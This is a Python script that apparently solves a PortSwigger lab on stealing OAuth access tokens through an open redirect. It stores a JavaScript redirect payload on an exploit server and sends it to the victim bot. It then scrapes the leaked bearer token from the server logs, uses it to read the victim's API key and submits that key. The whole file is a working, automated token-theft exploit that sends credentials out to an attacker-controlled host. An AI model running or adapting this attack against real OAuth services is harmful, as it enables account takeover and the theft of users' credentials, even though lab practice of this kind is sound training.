import sys
import requests
import re

#print("While testing this challenge, I had many times that the bots did not work. Even when I clicked manually. Also if it doesn't work it's not a bug in my code. It's an error on the part of portswigger")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
first_part = burp_url + '/social-login'
solution = burp_url + '/submitSolution'

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36'})
response = session.get(burp_url)
exploit_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text).group(0)
logs_url = exploit_server + '/log'

response = session.get(first_part)
second_part = re.search(r"content='3;url=(.*?)'>",response.text).group(1)
index_second_equal = second_part.find('=', second_part.find('=') + 1)
poczatek = second_part[:index_second_equal + 1]

me_url = 'https://' + second_part.split('/')[2] + '/me'

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<script>\r\n    if (!document.location.hash) {{\r\n        window.location = '{poczatek}{burp_url}/oauth-callback/../post/next?path={exploit_server}/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'\r\n    }} else {{\r\n        window.location = '/?'+document.location.hash.substr(1)\r\n    }}\r\n</script>", "formAction": "STORE"}

session.post(exploit_server, data=burp_data)

session.get(exploit_server+'/deliver-to-victim')

response = session.get(logs_url)
bearer = re.search(r'\?access_token=([^&]+)', response.text).group(1)
burp_headers = {"Authorization": "Bearer " + bearer}
r = session.get(me_url, headers=burp_headers)

answer = re.search(r'[0-9a-zA-Z]{32}', r.text).group(0)
burp_data = {"answer": answer}
session.post(solution, data=burp_data)
